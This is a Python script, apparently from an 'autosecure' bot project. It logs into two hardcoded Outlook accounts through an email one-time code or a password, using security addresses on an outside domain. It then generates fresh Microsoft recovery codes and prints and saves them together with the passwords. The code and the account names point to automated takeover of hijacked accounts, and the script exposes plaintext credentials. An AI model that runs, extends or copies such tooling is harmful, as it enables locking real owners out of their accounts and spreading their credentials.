#!/usr/bin/env python3
"""One-off: OTP login (direct/no-proxy) + GenerateRecoveryCode.

Does NOT modify config or restart pm2 autosecure-bot.
"""
from __future__ import annotations

import asyncio
import json
import logging
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import httpx
from fake_useragent import UserAgent

from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import dedupe_cookies, has_cookie
from securing.utils.login_pwd import login_pwd
from securing.utils.security.get_recovery_code import get_recovery_code
from securing.utils.security_information import security_information

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

ACCOUNTS = [
    {
        "email": "gotbeamed37fd77639c@outlook.com",
        "password": "Cs9J2N5SVgooJr",
        "security_email": "240053b91d30493e@ilovevbucks.site",
    },
    {
        "email": "gotbeameddde07ceb10@outlook.com",
        "password": "u1hEPLqiSNagAz",
        "security_email": "c7c6b2415de74388@ilovevbucks.site",
    },
]


def get_direct_session() -> httpx.AsyncClient:
    """Fresh httpx client with NO residential proxy (avoids vault timeout flakes)."""

    async def _dedupe_hook(response: httpx.Response) -> None:
        dedupe_cookies(client)

    client = httpx.AsyncClient(
        headers={
            "User-Agent": UserAgent().random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        timeout=httpx.Timeout(90.0, connect=40.0),
        cookies=httpx.Cookies(),
        event_hooks={"response": [_dedupe_hook]},
        follow_redirects=False,
    )
    return client


async def close_session(session: httpx.AsyncClient) -> None:
    try:
        await session.aclose()
    except Exception:
        pass


def _flowtoken(info: dict) -> str | None:
    if not info:
        return None
    response = info.get("response") if isinstance(info.get("response"), dict) else info
    credentials = response.get("Credentials", {}) if isinstance(response, dict) else {}
    proofs = credentials.get("OtcLoginEligibleProofs") or []
    if not proofs:
        return None
    return proofs[0].get("data")


async def _login_otp(session, email: str, security_email: str) -> bool:
    for round_i in range(1, 4):
        info = await send_auth(session, email, security_email)
        flowtoken = _flowtoken(info)
        if not flowtoken:
            print(f"[{email}] no OTP proof (round {round_i})")
            await asyncio.sleep(3)
            continue
        live = await livedata(session)
        since = time.time()
        print(f"[{email}] waiting OTP round {round_i}/3 (100s)...")
        code = await get_email_code(security_email, timeout=100, since=since)
        print(f"[{email}] otp={code}")
        if not code:
            continue
        odata = {"urlPost": live["urlPost"], "ppft": live["ppft"]}
        if isinstance(info, dict) and info.get("ppft"):
            odata["ppft"] = info["ppft"]
        msa = await get_msaauth(session, email, flowtoken, odata, code, ppft=odata["ppft"])
        if isinstance(msa, str):
            msa = get_data(msa)
        if not msa or (isinstance(msa, dict) and not msa.get("urlPost")):
            if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
                msa = {"_cookies_only": True}
            else:
                print(f"[{email}] OTP login no MSAAUTH")
                continue
        await polish_host(session, msa if isinstance(msa, dict) else {"_cookies_only": True})
        return True
    return False


async def _login_pwd(session, email: str, password: str) -> bool:
    live = await livedata(session)
    page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
    msa = get_data(page)
    handled = await handle_redirects(session, page)
    if isinstance(handled, dict) and handled.get("urlPost"):
        msa = handled
    elif isinstance(handled, str):
        msa = get_data(handled) or msa
    if not msa or not msa.get("urlPost"):
        if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
            msa = {"_cookies_only": True}
        else:
            return False
    await polish_host(session, msa)
    return True


async def _try_generate(session, email, password, security_email) -> str | None:
    last = None
    for i in range(1, 4):
        try:
            apicanary = await get_cookies(session)
            params_raw = await security_information(
                session,
                security_email=security_email,
                account_email=email,
                password=password,
                skip_i5600_otp=False,
            )
            params = json.loads(params_raw) if isinstance(params_raw, str) else params_raw
            eni = (
                ((params or {}).get("WLXAccount") or {})
                .get("manageProofs", {})
                .get("encryptedNetId")
            )
            if not eni:
                last = "missing encryptedNetId"
                print(f"[{email}] gen try {i}: {last}")
                await asyncio.sleep(5)
                continue
            apicanary = (await get_cookies(session)) or apicanary
            if not apicanary:
                last = "no apiCanary"
                print(f"[{email}] gen try {i}: {last}")
                continue
            rc = await get_recovery_code(session, apicanary, eni)
            if rc:
                return rc
            last = "empty recoveryCode"
            print(f"[{email}] gen try {i}: {last}")
        except Exception as exc:
            last = f"{exc.__class__.__name__}: {exc}"
            print(f"[{email}] gen try {i}: {last}")
            await asyncio.sleep(4)
    print(f"[{email}] generate failed: {last}")
    return None


async def regen_one(acc: dict) -> dict:
    email = acc["email"]
    password = acc["password"]
    security_email = acc["security_email"]
    out = {
        "email": email,
        "password": password,
        "security_email": security_email,
        "recovery_code": None,
        "error": None,
    }

    for attempt in range(1, 4):
        session = get_direct_session()
        try:
            print(f"\n=== {email} attempt {attempt}/3 (direct/no-proxy) ===")
            ok = await _login_otp(session, email, security_email)
            if not ok:
                print(f"[{email}] OTP failed — password fallback")
                await close_session(session)
                session = get_direct_session()
                ok = await _login_pwd(session, email, password)
            if not ok:
                out["error"] = "login failed"
                print(f"[{email}] login failed")
                await asyncio.sleep(8)
                continue
            print(f"[{email}] session ok — generating recovery code")
            rc = await _try_generate(session, email, password, security_email)
            if rc:
                out["recovery_code"] = rc
                out["error"] = None
                print(f"[{email}] NEW RECOVERY CODE: {rc}")
                return out
            out["error"] = "could not generate recovery code"
        except Exception as exc:
            out["error"] = f"{exc.__class__.__name__}: {exc}"
            print(f"[{email}] ERROR {out['error']}")
        finally:
            await close_session(session)
        await asyncio.sleep(15)
    return out


async def main():
    print("Cooling 60s for OTP rate-limits...")
    await asyncio.sleep(60)
    results = []
    for acc in ACCOUNTS:
        results.append(await regen_one(acc))
        await asyncio.sleep(20)

    print("\n========== RESULTS ==========")
    for r in results:
        print(
            f"{r['email']}\n"
            f"  password: {r['password']}\n"
            f"  security: {r['security_email']}\n"
            f"  recovery: {r['recovery_code']}\n"
            f"  error: {r['error']}\n"
        )
    out_path = Path(__file__).resolve().parents[1] / "forensics" / "regen_rc_two_accounts.json"
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(results, indent=2))
    print(f"wrote {out_path}")


if __name__ == "__main__":
    asyncio.run(main())
